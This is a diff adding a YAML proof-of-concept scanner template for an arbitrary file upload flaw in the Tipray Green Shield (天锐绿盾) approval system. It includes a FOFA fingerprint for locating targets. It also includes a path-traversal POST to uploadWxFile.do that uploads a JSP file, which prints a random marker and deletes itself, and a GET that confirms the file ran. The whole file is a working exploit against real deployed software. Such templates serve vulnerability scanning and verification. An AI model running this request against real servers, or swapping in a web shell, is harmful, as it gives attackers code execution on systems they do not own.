@@ -1,0 +1,29 @@
+id: poc-yaml-tipray-gsas-login-jsp-anyfile-upload
+info:
+  name: 天锐绿盾审批系统 login.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/config/uploadWxFile.do
+  headers:
+    Content-Type: multipart/form-data; boundary=----123
+  data: '------123
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------123--'
+  expression: status_code == 200 && body == "true"
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
